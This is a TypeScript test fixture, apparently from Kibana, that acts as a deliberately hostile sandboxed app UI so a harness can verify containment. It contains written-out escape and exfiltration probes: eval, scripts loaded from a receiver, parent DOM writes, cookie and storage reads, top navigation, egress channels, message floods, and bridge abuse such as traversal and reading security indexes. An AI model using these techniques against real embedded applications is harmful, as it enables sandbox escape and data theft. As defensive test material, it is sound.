/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the Elastic License
 * 2.0; you may not use this file except in compliance with the Elastic License
 * 2.0.
 */

// Deliberately hostile app UI (synthetic adversarial fixture). It holds the app's real grant and
// tries to escape it: execution primitives, parent DOM/storage, every egress channel, popups,
// navigation, bridge abuse and an unsafe renderer. Results are recorded in `window.__probe` for the
// harness to read. Navigation and click probes are exposed as functions the harness triggers, one
// per fresh frame, because a blocked navigation ends the frame.

import { connectBridge, errorCode } from '../src/sdk';
import { runChannels } from './channels';

declare const __UI_VERSION__: string;
declare const __UI_LABEL__: string;
declare const __DASHBOARD_ID__: string;
declare const __RECEIVER__: string;
declare const __KIBANA__: string;
/** A receiver used only by the preconnect probe, so its TCP connections are attributable exactly. */
declare const __PRECONNECT__: string;

type Outcome = string;
const results: Record<string, Outcome> = {};
let heldPort: MessagePort | undefined;
let heldBridge: unknown;
const violations: string[] = [];
const probe = {
  results,
  violations,
  done: false,
  bridge: {} as Record<string, Outcome>,
  run: {} as Record<string, (marker: string) => unknown>,
};
(window as unknown as { __probe: typeof probe }).__probe = probe;

document.addEventListener('securitypolicyviolation', (event) => {
  violations.push(`${event.effectiveDirective}|${event.blockedURI}`.slice(0, 300));
});

const root = document.getElementById('app-root') ?? document.body;
const header = document.createElement('div');
header.id = 'ui-version';
header.textContent = `${__UI_LABEL__} UI ${__UI_VERSION__} (hostile fixture)`;
root.append(header);

const ATTEMPT_TIMEOUT_MS = 2500;

/** Runs one probe; a probe that never settles (some engines leave storage opens pending) times out. */
const attempt = async (name: string, action: () => unknown): Promise<void> => {
  try {
    const value = await Promise.race([
      Promise.resolve().then(action),
      new Promise((_, reject) =>
        setTimeout(
          () => reject(Object.assign(new Error('timeout'), { name: 'Timeout' })),
          ATTEMPT_TIMEOUT_MS
        )
      ),
    ]);
    results[name] = `executed:${String(value).slice(0, 80)}`;
  } catch (error) {
    results[name] = `blocked:${(error as Error)?.name ?? 'Error'}`;
  }
};

const receiver = (marker: string, path = 'hit') => `${__RECEIVER__}/${path}?m=${marker}`;

// Minimal valid WebAssembly module (magic + version).
const WASM = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0]);

/** Deliberately unsafe renderer: parses attacker-shaped markup and inserts it live. */
const addElement = (html: string) => {
  const holder = document.createElement('div');
  const parsed = new DOMParser().parseFromString(`<body>${html}</body>`, 'text/html');
  holder.append(
    ...Array.from(parsed.body.childNodes).map((node) => document.importNode(node, true))
  );
  root.append(holder);
  return holder;
};

const executionProbes = async () => {
  const indirectEval = (globalThis as unknown as Record<string, (code: string) => unknown>)[
    ['ev', 'al'].join('')
  ];
  await attempt('eval', () => indirectEval('1 + 1'));
  await attempt('function', () => (Reflect.construct(Function, ['return 2']) as () => number)());
  await attempt('setTimeoutString', () => {
    (window.setTimeout as unknown as (code: string) => number)('window.__timeoutRan = 1');
    return 'scheduled';
  });
  await attempt('wasmCompile', () => WebAssembly.compile(WASM));
  await attempt('wasmInstantiate', () => WebAssembly.instantiate(WASM));
  await attempt(
    'dynamicImportReceiver',
    () => import(/* @vite-ignore */ receiver('dynimport', 'mod.js'))
  );
  await attempt(
    'dynamicImportGuardian',
    () => import(/* @vite-ignore */ `${__KIBANA__}/api/app_host/ui_assets/host-guardian.js`)
  );
  const scriptLoad = (name: string, src: string) =>
    new Promise<void>((resolve) => {
      const script = document.createElement('script');
      script.src = src;
      script.onload = () => {
        results[name] = 'loaded';
        resolve();
      };
      script.onerror = () => {
        results[name] = 'blocked:error';
        resolve();
      };
      document.head.append(script);
      setTimeout(resolve, 3000);
    });
  await scriptLoad('scriptReceiver', receiver('script', 'evil.js'));
  await scriptLoad('scriptOtherHostAsset', `${__KIBANA__}/api/app_host/ui_assets/host-guardian.js`);
  await scriptLoad('scriptKibanaBundle', `${__KIBANA__}/bootstrap.js`);
  const inline = document.createElement('script');
  inline.textContent = 'window.__inlineRan = true;';
  document.head.append(inline);
  results.inlineScript = (window as unknown as { __inlineRan?: boolean }).__inlineRan
    ? 'executed'
    : 'blocked';
  addElement('<img src="data:," onerror="window.__handlerRan = true">');
  await new Promise((resolve) => setTimeout(resolve, 300));
  results.inlineHandler = (window as unknown as { __handlerRan?: boolean }).__handlerRan
    ? 'executed'
    : 'blocked';
};

const parentProbes = async () => {
  await attempt('parentDocument', () => window.parent.document.title);
  await attempt('topDocument', () => window.top?.document.title);
  await attempt('parentBodyWrite', () => {
    window.parent.document.body.textContent = 'PWN';
    return 'written';
  });
  await attempt('cookie', () => document.cookie);
  await attempt('localStorage', () => window.localStorage.getItem('x'));
  await attempt('sessionStorage', () => window.sessionStorage.getItem('x'));
  await attempt(
    'indexedDB',
    () =>
      new Promise((resolve, reject) => {
        const request = indexedDB.open('app-host-probe');
        request.onsuccess = () => resolve('opened');
        request.onerror = () => reject(request.error ?? new Error('idb'));
      })
  );
  await attempt('cacheStorage', () => caches.open('app-host-probe'));
  await attempt('serviceWorker', () => navigator.serviceWorker.register('/sw.js'));
  await attempt('windowOpen', () => {
    const opened = window.open(receiver('popup'), '_blank');
    return opened ? 'opened' : 'null';
  });
  await attempt('requestFullscreen', () => document.documentElement.requestFullscreen());
  await attempt('clipboardWrite', () => navigator.clipboard.writeText('app-host-probe'));
  // Fixed-position, high z-index overlay: must stay clipped to the frame rectangle.
  const overlay = document.createElement('div');
  overlay.id = 'overlay';
  overlay.style.cssText =
    'position:fixed;top:-2000px;left:-2000px;width:10000px;height:10000px;z-index:2147483647;background:rgba(255,0,0,0.2);pointer-events:none;';
  document.body.append(overlay);
  results.overlay = 'placed';
};

// T4: one resource channel at a time with per-attempt markers (shared with the control page).
probe.run.channels = (prefix) => runChannels(__RECEIVER__, prefix) as unknown as Outcome;
// Credentialed requests to Kibana itself (`/api/spaces/space/<x>`: 401 without the session cookie,
// 404 with it), for the ordinary and the SameSite=None cookie configurations.
probe.run.kibanaChannels = (prefix) =>
  runChannels(`${__KIBANA__}/api/spaces/space`, prefix, [
    'fetch',
    'fetchnocors',
    'xhr',
    'beacon',
    'img',
    'script',
    'stylesheet',
    'cssbg',
    'nestedframe',
  ]) as unknown as Outcome;
// F6: preconnect alone, to a receiver nothing else uses.
probe.run.preconnect = () => {
  addElement(`<link rel="preconnect" href="${__PRECONNECT__}">`);
  return 'inserted';
};
probe.run.dnsPrefetch = () => {
  addElement(`<link rel="dns-prefetch" href="//app-host-dns-canary.invalid">`);
  return 'inserted';
};
probe.run.webrtc = async () => {
  const connection = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:3478' }] });
  connection.createDataChannel('x');
  await connection.setLocalDescription(await connection.createOffer());
  await new Promise((resolve) => setTimeout(resolve, 1500));
  const candidates = (connection.localDescription?.sdp ?? '').split('a=candidate').length - 1;
  connection.close();
  return `candidates=${candidates}`;
};

const bridgeProbes = async () => {
  const connection = connectBridge();
  if (!connection) {
    probe.bridge.connect = 'no-port';
    return;
  }
  const { bridge, port } = connection;
  heldPort = port;
  heldBridge = bridge;
  const raw = bridge as unknown as Record<string, (...args: unknown[]) => Promise<unknown>>;
  const call = async (name: string, run: () => Promise<unknown>) => {
    try {
      const value = await run();
      probe.bridge[name] = `ok:${JSON.stringify(value).slice(0, 200)}`;
    } catch (error) {
      probe.bridge[name] = `err:${errorCode(error)}`;
    }
  };
  // Permitted reads: a compromised UI still holds the app's grant (report these honestly).
  await call('summary', () => bridge.callAppRoute({ method: 'GET', path: '/summary' }));
  await call('search', () => bridge.search({ index: 'kbn-apps-prototype-alerts', size: 100 }));
  await call('dashboard', () => bridge.getDashboardPreview({ id: __DASHBOARD_ID__ }));
  // A few out-of-grant attempts in the auto-run; the full corpus is `run.bridgeCase(name)` (too many
  // invalid calls terminate the session by design).
  await call('otherIndex', () => raw.search({ index: '.security-7', size: 1 }));
  await call('ungrantedDashboard', () =>
    raw.getDashboardPreview({ id: '00000000-0000-4000-8000-000000000000' })
  );
  await call('unknownMethod', () => raw.createApiKey({ name: 'x' }));
  // A replacement port / rebind attempt: no window listener remains in the guardian or top.
  const fake = new MessageChannel();
  window.parent.postMessage({ t: 'port', p: 'app_host.ui.v1', c: 'x' }, '*', [fake.port2]);
  window.parent.postMessage({ t: 'ready', p: 'app_host.ui.v1', c: 'x' }, '*');
  window.top?.postMessage({ t: 'init', p: 'app_host.ui.v1', c: 'x'.repeat(43) }, '*');
  await call('afterSpoof', () => bridge.getTheme());
  probe.bridge.port = port ? 'held' : 'none';
};

/** One named abuse case per call: `ok:<json>` or `err:<code>` (never an evaluation string). */
const ABUSE: Record<
  string,
  (raw: Record<string, (...args: unknown[]) => Promise<unknown>>) => Promise<unknown>
> = {
  otherRoute: (raw) => raw.callAppRoute({ method: 'GET', path: '/admin' }),
  traversal: (raw) => raw.callAppRoute({ method: 'GET', path: '/summary/../../x' }),
  encodedPath: (raw) => raw.callAppRoute({ method: 'GET', path: '%2Fsummary' }),
  queryTrick: (raw) => raw.callAppRoute({ method: 'GET', path: '/summary?x=1' }),
  postMethod: (raw) => raw.callAppRoute({ method: 'POST', path: '/summary' }),
  otherIndex: (raw) => raw.search({ index: '.security-7', size: 1 }),
  auditIndex: (raw) => raw.search({ index: 'logs-kibana.audit-default', size: 1 }),
  wildcard: (raw) => raw.search({ index: 'kbn-*', size: 1 }),
  extraField: (raw) =>
    raw.search({ index: 'kbn-apps-prototype-alerts', size: 1, query: { match_all: {} } }),
  ungrantedDashboard: (raw) =>
    raw.getDashboardPreview({ id: '00000000-0000-4000-8000-000000000000' }),
  unknownMethod: (raw) => raw.createApiKey({ name: 'x' }),
  functionArg: (raw) => raw.search(() => 1),
  thenableArg: (raw) => raw.search({ then: (r: (v: unknown) => void) => r(1) }),
  alive: (raw) => raw.getTheme(),
};
probe.run.bridgeCase = async (name) => {
  const run = ABUSE[name];
  if (!run || !heldBridge) return `missing:${name}`;
  try {
    const value = await run(
      heldBridge as unknown as Record<string, (...args: unknown[]) => Promise<unknown>>
    );
    return `ok:${JSON.stringify(value).slice(0, 200)}`;
  } catch (error) {
    return `err:${errorCode(error)}`;
  }
};

// Prototype/Object member names sent as raw capnweb frames (an honest SDK stub handles these names
// locally and never sends them). Uses `stream` frames, which the parent resolves on its own and
// answers with the id it assigned, so no export id has to be guessed. Takes over the port: it must
// be the last bridge use in a frame.
probe.run.rawProtocolNames = async () => {
  const port = heldPort;
  if (!port) return { error: 'no-port' };
  const replies: unknown[][] = [];
  port.onmessage = (event) => {
    if (typeof event.data === 'string') replies.push(JSON.parse(event.data));
  };
  const names = ['constructor', '__proto__', 'toString', 'hasOwnProperty', 'valueOf'];
  for (const name of names) {
    port.postMessage(JSON.stringify(['stream', ['pipeline', 0, [name], ['x']]]));
  }
  await new Promise((resolve) => setTimeout(resolve, 1500));
  // Replies to these frames, in the parent's id order (= send order).
  const answered = replies
    .filter(([type]) => type === 'resolve' || type === 'reject')
    .sort((a, b) => Number(a[1]) - Number(b[1]))
    .slice(-names.length);
  // Pairs, not an object: '__proto__' is not a safe key to serialize.
  return names.map((name, i) => [
    name,
    answered[i] ? JSON.stringify(answered[i]).slice(0, 200) : 'no-reply',
  ]);
};

// F1: navigating the parent (the guardian) in its common variants. Each variant runs in a fresh
// frame. A sandboxed frame without allow-top-navigation may navigate only itself.
probe.run.parentNavigation = (variant) => {
  const target = receiver(`parentnav-${variant}`, 'parentnav');
  try {
    const parent = window.parent as Window;
    switch (variant) {
      case 'assignLocation':
        (parent as unknown as { location: string }).location = target;
        break;
      case 'href':
        parent.location.href = target;
        break;
      case 'assign':
        parent.location.assign(target);
        break;
      case 'replace':
        parent.location.replace(target);
        break;
      case 'openSelf':
        parent.open(target, '_self');
        break;
      case 'openParent':
        window.open(target, '_parent');
        break;
      default:
        return `unknown:${variant}`;
    }
    return 'executed';
  } catch (error) {
    return `blocked:${(error as Error).name}`;
  }
};

// <a ping> needs a navigation; a same-document fragment navigation is enough. (WebKit fires the
// iframe element's load event for it, which the guardian treats as a reload: run it last.)
probe.run.ping = (marker) => {
  addElement(`<a id="ping-link" href="#x" ping="${receiver(marker, 'ping')}">ping</a>`);
  (document.getElementById('ping-link') as HTMLAnchorElement).click();
  return 'attempted';
};
probe.run.navigateReceiver = (marker) => {
  window.location.href = receiver(marker, 'nav');
  return 'attempted';
};
probe.run.navigateKibana = (marker) => {
  window.location.href = `${__KIBANA__}/app/home?m=${marker}`;
  return 'attempted';
};
probe.run.navigateRedirect = (marker) => {
  window.location.href = `${__KIBANA__}/login?next=${encodeURIComponent(
    receiver(marker, 'redir')
  )}`;
  return 'attempted';
};
probe.run.linkClick = (marker) => {
  const link = document.createElement('a');
  link.href = receiver(marker, 'link');
  document.body.append(link);
  link.click();
  return 'attempted';
};
probe.run.metaRefresh = (marker) => {
  addElement(`<meta http-equiv="refresh" content="0;url=${receiver(marker, 'meta')}">`);
  return 'attempted';
};
probe.run.selfFrameQuery = (marker) => {
  window.location.href = `${window.location.href.split('?')[0]}?m=${marker}`;
  return 'attempted';
};
probe.run.setWindowNameAndNavigate = (marker) => {
  window.name = `leak-${marker}`;
  window.location.href = receiver(marker, 'namenav');
  return 'attempted';
};
probe.run.topNavigation = (marker) => {
  try {
    (window.top as Window).location.href = receiver(marker, 'topnav');
    return 'executed';
  } catch (error) {
    return `blocked:${(error as Error).name}`;
  }
};
probe.run.reload = () => {
  window.location.reload();
  return 'attempted';
};
probe.run.historyBack = () => {
  window.history.back();
  return 'attempted';
};
probe.run.flood = async () => {
  const big = 'x'.repeat(1024 * 1024);
  const started = Date.now();
  for (let i = 0; i < 1000; i++) {
    window.parent.postMessage(big, '*');
    window.top?.postMessage(big, '*');
  }
  return `posted 2000 x 1MiB in ${Date.now() - started}ms`;
};
probe.run.oversizedFrame = () => {
  heldPort?.postMessage('x'.repeat(33 * 1024));
  return heldPort ? 'sent' : 'no-port';
};

// Click-activated probes (real user activation via the harness's frame.click()).
// Each handler first logs `app-host-click:<id>` (observed by the harness through the browser's
// console, which survives a frame reload) so that "nothing happened" can't mean "never clicked".
const button = (id: string, label: string, onClick: () => void) => {
  const element = document.createElement('button');
  element.id = id;
  element.textContent = label;
  element.addEventListener('click', () => {
    // eslint-disable-next-line no-console
    console.log(`app-host-click:${id}`);
    onClick();
  });
  root.append(element);
};
// Unique per action: set by the harness through `run.setClickMarker` before each click.
let clickMarker = 'click-unset';
probe.run.setClickMarker = (marker) => {
  clickMarker = marker;
  return clickMarker;
};
button('click-popup', 'popup', () => {
  results.clickPopup = window.open(receiver(clickMarker, 'clickpopup'), '_blank')
    ? 'opened'
    : 'null';
});
button('click-top', 'top', () => {
  try {
    (window.top as Window).location.href = receiver(clickMarker, 'topnav');
    results.clickTop = 'executed';
  } catch (error) {
    results.clickTop = `blocked:${(error as Error).name}`;
  }
});
button('click-fullscreen', 'fullscreen', () => {
  document.documentElement.requestFullscreen().then(
    () => (results.clickFullscreen = 'executed'),
    (error) => (results.clickFullscreen = `blocked:${error?.name}`)
  );
});
button('click-download', 'download', () => {
  const link = document.createElement('a');
  link.href = 'data:text/plain,app-host-probe';
  link.download = 'probe.txt';
  document.body.append(link);
  link.click();
  results.clickDownload = 'attempted';
});
button('click-top-link', 'top link', () => {
  const link = document.createElement('a');
  link.href = receiver(clickMarker, 'topnav');
  link.target = '_top';
  document.body.append(link);
  link.click();
  results.clickTopLink = 'attempted';
});
button('click-form', 'form', () => {
  const form = document.createElement('form');
  form.action = receiver(clickMarker, 'clickform');
  form.method = 'POST';
  form.target = '_top';
  document.body.append(form);
  try {
    form.submit();
    results.clickForm = 'submitted';
  } catch (error) {
    results.clickForm = `blocked:${(error as Error).name}`;
  }
});

const main = async () => {
  // Bridge first, so the port is taken before any probe can disturb the document.
  await bridgeProbes();
  await executionProbes();
  await parentProbes();
  probe.done = true;
  document.body.setAttribute('data-ready', 'true');
};
main();
